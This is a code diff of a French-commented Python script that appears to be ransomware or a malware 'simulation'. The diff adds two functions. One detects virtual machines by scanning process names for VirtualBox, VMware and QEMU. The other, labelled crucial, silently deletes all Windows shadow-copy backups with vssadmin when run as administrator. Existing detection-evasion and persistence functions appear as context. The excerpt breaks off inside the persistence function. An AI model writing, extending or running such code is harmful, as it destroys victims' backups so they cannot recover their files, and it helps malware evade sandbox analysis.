@@ -1,15 +1,27 @@
-import os, sys, random, time, subprocess, ctypes
+# -*- coding: utf-8 -*-
+import os, sys, random, time, subprocess, ctypes, psutil
 from pathlib import Path
 
 def is_admin():
-    """Vérifie si le script est lancé avec des droits Administrateur/Root"""
     try:
-        if os.name == 'nt': # Windows
-            return ctypes.windll.shell32.IsUserAnAdmin() != 0
-        else: # Linux
-            return os.getuid() == 0
-    except AttributeError:
-        return False
+        if os.name == 'nt': return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else: return os.getuid() == 0
+    except: return False
+
+def check_anti_vm():
+    vm_keywords = ['virtualbox', 'vmware', 'qemu', 'microsoft corporation']
+    for proc in psutil.process_iter(['name']):
+        if any(key in proc.info['name'].lower() for key in vm_keywords):
+            return True
+    return False
+
+def delete_shadow_copies():
+    """FONCTION CRUCIALE : Supprime les sauvegardes Windows"""
+    if os.name == 'nt' and is_admin():
+        try:
+            subprocess.run(['vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'], 
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except: pass
 
 def evade_detection():
     try:
@@ -18,8 +30,7 @@ def evade_detection():
     time.sleep(random.uniform(0.5, 2.0))
 
 def clear_screen():
-    subprocess.run(['cls' if os.name == 'nt' else 'clear'], 
-                  shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(['cls' if os.name == 'nt' else 'clear'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def simulate_persistence():
     if os.name == 'nt':
